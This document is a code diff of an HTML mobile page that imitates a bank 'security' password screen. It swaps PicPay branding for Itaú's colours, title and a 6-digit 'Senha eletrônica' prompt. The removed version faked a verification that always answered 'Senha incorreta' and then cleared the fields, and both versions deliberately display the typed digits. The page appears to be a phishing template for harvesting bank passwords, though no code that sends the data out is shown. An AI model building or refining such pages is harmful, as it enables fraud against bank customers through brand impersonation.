@@ -3,98 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PicPay | Segurança</title>
+    <title>Itaú | Segurança</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
         
         :root {
-            --picpay-green: #21C25E;
-            --picpay-green-dark: #1aa34e;
-            --picpay-bg: #000000;
-            --picpay-surface: #121212;
-            --picpay-error: #FF4B4B;
+            --itau-orange: #EC7000;
+            --itau-blue: #003399;
+            --itau-gray: #5E6E79;
         }
 
         body, html {
             height: 100%;
             margin: 0;
-            padding: 0;
-            background-color: var(--picpay-bg);
-            font-family: 'Inter', sans-serif;
-            color: white;
+            background-color: white;
+            font-family: 'Roboto', sans-serif;
+            color: #333;
             overflow: hidden;
-        }
-
-        .app-container {
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            position: relative;
         }
 
         .app-header {
             height: 60px;
-            padding: 0 16px;
+            background-color: var(--itau-blue);
+            color: white;
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            padding: 0 16px;
+            font-weight: 500;
         }
 
         .pin-container {
             display: grid;
-            grid-template-columns: repeat(8, 1fr);
-            gap: 8px;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 12px;
             width: 100%;
-            max-width: 320px;
-            margin-top: 32px;
+            max-width: 280px;
+            margin-top: 40px;
         }
 
         .pin-field {
             aspect-ratio: 1 / 1;
-            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid #CCC;
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 1.5rem;
             font-weight: 700;
-            color: white;
-            transition: all 0.2s ease;
-            min-height: 40px;
+            color: var(--itau-blue);
+            background: #F4F4F4;
         }
 
         .pin-field.active {
-            border-bottom-color: var(--picpay-green);
-        }
-
-        /* Removido o efeito de esconder senha para torná-la visível */
-        .pin-field.filled {
-            color: var(--picpay-green);
-        }
-
-        .pin-field.error {
-            border-bottom-color: var(--picpay-error);
-            color: var(--picpay-error);
-        }
-
-        .btn-picpay {
-            background-color: var(--picpay-green);
-            color: white;
-            font-weight: 700;
-            font-size: 1rem;
-            border-radius: 100px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s ease;
-        }
-
-        .btn-picpay:disabled {
-            background-color: #262626;
-            color: #525252;
+            border-color: var(--itau-orange);
+            background: white;
+            box-shadow: 0 0 0 2px rgba(236, 112, 0, 0.2);
         }
 
         #real-input {
@@ -103,56 +68,36 @@
             pointer-events: none;
         }
 
-        .loader {
-            width: 22px;
-            height: 22px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .btn-itau {
+            background-color: var(--itau-orange);
+            color: white;
+            font-weight: 700;
+            padding: 16px;
+            border-radius: 4px;
+            width: 100%;
+            transition: opacity 0.2s;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Animação de erro */
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-        .shake {
-            animation: shake 0.2s ease-in-out 0s 2;
+        .btn-itau:disabled {
+            opacity: 0.5;
         }
     </style>
 </head>
 <body onclick="document.getElementById('real-input').focus()">
 
-    <div class="app-container">
+    <div class="flex flex-col h-screen">
         <header class="app-header">
-            <button class="p-2">
-                <i data-lucide="arrow-left" class="w-6 h-6 text-white"></i>
-            </button>
-            <span class="font-bold text-lg">Segurança</span>
-            <div class="w-10"></div>
+            <i data-lucide="chevron-left" class="mr-4"></i>
+            <span class="text-lg">Itaú segurança</span>
         </header>
 
-        <main class="flex-1 px-6 pt-10 flex flex-col items-center">
-            <div class="w-16 h-16 bg-[#121212] rounded-2xl flex items-center justify-center mb-6">
-                <i data-lucide="lock" class="w-8 h-8 text-[#21C25E]"></i>
-            </div>
-            
-            <h1 class="text-xl font-bold text-center mb-2">Digite sua senha</h1>
-            <p class="text-center text-gray-400 text-sm mb-8">
-                Para sua segurança, informe sua senha de <br>
-                <span class="text-white">8 dígitos</span> do PicPay.
+        <main class="flex-1 px-8 pt-12 flex flex-col items-center">
+            <h1 class="text-2xl font-bold text-gray-800 text-center">Senha eletrônica</h1>
+            <p class="text-center text-gray-600 mt-4">
+                Digite sua senha de <span class="font-bold">6 dígitos</span>
             </p>
 
             <div class="pin-container" id="pin-display">
-                <!-- 8 campos de PIN -->
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
                 <div class="pin-field"></div>
                 <div class="pin-field"></div>
                 <div class="pin-field"></div>
@@ -161,32 +106,24 @@
                 <div class="pin-field"></div>
             </div>
 
-            <!-- Input real escondido para capturar o teclado -->
-            <!-- Alterado para type="text" para suportar visualização se necessário, 
-                 mantendo maxlength e inputmode -->
             <input 
                 type="text" 
                 id="real-input" 
-                maxlength="8" 
+                maxlength="6" 
                 inputmode="numeric" 
+                pattern="[0-9]*"
                 autocomplete="off"
                 autofocus
             >
-
-            <div id="error-msg" class="text-red-500 text-sm mt-6 hidden font-medium">
-                Senha incorreta. Tente novamente.
-            </div>
         </main>
 
-        <footer class="p-6 pb-10">
-            <button id="btn-confirm" disabled class="btn-picpay w-full">
-                <span id="btn-text">Finalizar</span>
-                <span id="btn-loader" class="loader hidden"></span>
+        <footer class="p-8">
+            <button id="btn-confirm" disabled class="btn-itau">
+                Confirmar
             </button>
-            
-            <button class="w-full mt-6 py-2 text-[#21C25E] text-sm font-semibold">
+            <div class="text-center mt-6 text-sm text-[#003399] font-medium">
                 Esqueci minha senha
-            </button>
+            </div>
         </footer>
     </div>
 
@@ -196,29 +133,21 @@
         const realInput = document.getElementById('real-input');
         const pinFields = document.querySelectorAll('.pin-field');
         const btnConfirm = document.getElementById('btn-confirm');
-        const btnText = document.getElementById('btn-text');
-        const btnLoader = document.getElementById('btn-loader');
-        const errorMsg = document.getElementById('error-msg');
-        const pinContainer = document.getElementById('pin-display');
 
+        // Garante o foco inicial
         window.onload = () => realInput.focus();
 
         realInput.addEventListener('input', (e) => {
-            const val = e.target.value.replace(/[^0-9]/g, ''); // Garante apenas números
+            // Remove qualquer caractere que não seja número
+            const val = e.target.value.replace(/[^0-9]/g, '');
             e.target.value = val;
             
-            errorMsg.classList.add('hidden');
-            pinContainer.classList.remove('shake');
-            
             pinFields.forEach((field, i) => {
-                field.classList.remove('error');
-                
                 if (i < val.length) {
-                    field.textContent = val[i]; // Torna o número VISÍVEL
-                    field.classList.add('filled', 'active');
+                    field.textContent = val[i]; // Senha Visível
+                    field.classList.remove('active');
                 } else {
                     field.textContent = '';
-                    field.classList.remove('filled');
                     if (i === val.length) {
                         field.classList.add('active');
                     } else {
@@ -227,38 +156,10 @@
                 }
             });
 
-            btnConfirm.disabled = (val.length !== 8);
+            btnConfirm.disabled = (val.length !== 6);
         });
 
-        btnConfirm.addEventListener('click', () => {
-            btnConfirm.disabled = true;
-            btnText.classList.add('hidden');
-            btnLoader.classList.remove('hidden');
-
-            // Simulação de verificação
-            setTimeout(() => {
-                btnLoader.classList.add('hidden');
-                btnText.classList.remove('hidden');
-                
-                // Exibe erro e animação de vibração
-                errorMsg.classList.remove('hidden');
-                pinContainer.classList.add('shake');
-                pinFields.forEach(f => f.classList.add('error'));
-                
-                // Limpa campos após o erro para nova tentativa
-                setTimeout(() => {
-                    realInput.value = '';
-                    pinFields.forEach(f => {
-                        f.textContent = '';
-                        f.classList.remove('filled', 'active', 'error');
-                    });
-                    btnConfirm.disabled = true;
-                    realInput.focus();
-                }, 1200);
-
-            }, 1500);
-        });
-
+        // Impede que o usuário perca o foco do teclado
         document.body.addEventListener('click', () => realInput.focus());
     </script>
 </body>
